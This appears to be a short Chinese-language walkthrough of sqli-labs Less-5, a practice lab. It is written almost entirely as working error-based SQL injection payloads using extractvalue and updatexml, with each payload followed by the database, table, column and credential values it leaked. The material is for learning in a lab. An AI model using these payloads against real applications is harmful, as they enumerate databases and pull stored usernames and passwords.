# 原创
：  less-5 in sqli-labs

# less-5 in sqli-labs

### **less-5**

**基于extractvalue报错注入**

```
?id=1' --+
You are in...........      #无有用信息 考虑报错注入

?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+
XPATH syntax error: '~security~'

?id=1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+
XPATH syntax error: '~users~'     #0-3一起4个表

?id=1' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 3,1),0x7e)) --+
XPATH syntax error: '~id~'        #3,4,5分别是id,username,password


?id=1' and extractvalue(1,concat(0x7e,( select concat(id,0x7e,username,0x7e,password) from users limit 0,1),0x7e)) --+			# 从" users "表里对应的列名中爆出一个数据来
XPATH syntax error: '~1~Dumb~Dumb~'

```

**基于updatexml报错注入**

```
?id=1' and extractvalue(1,concat(0x7e,( select concat(id,0x7e,username,0x7e,password) from users limit 0,1),0x7e)) --+			

?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+
XPATH syntax error: '~security~'

?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) --+
XPATH syntax error: '~emails~'    

?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),1) --+
XPATH syntax error: '~USER~'      

?id=1' and updatexml(1,concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from users limit 0,1),0x7e),1) --+
XPATH syntax error: '~1~Dumb~Dumb~'

```
